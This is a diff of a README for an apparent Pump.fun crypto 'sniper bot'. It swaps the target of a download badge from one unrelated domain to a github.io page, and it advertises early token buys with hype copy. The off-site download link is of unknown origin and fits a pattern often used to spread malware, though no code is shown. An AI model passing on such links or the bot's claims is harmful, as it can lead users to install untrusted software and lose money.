@@ -2,7 +2,7 @@
 
 Snipe moonshot tokens on Pump.fun the moment they gain traction. This sniper bot analyzes real-time metrics and executes buys before the crowd. Auto or manual — your choice.
 
-[![Download Sniper Bot](https://img.shields.io/badge/Download-PumpFun_Sniper-blueviolet)](https://seomadjest.com)
+[![Download Sniper Bot](https://img.shields.io/badge/Download-PumpFun_Sniper-blueviolet)](https://pump-fun-sniping-bot.github.io/.github)
 
 ---
 
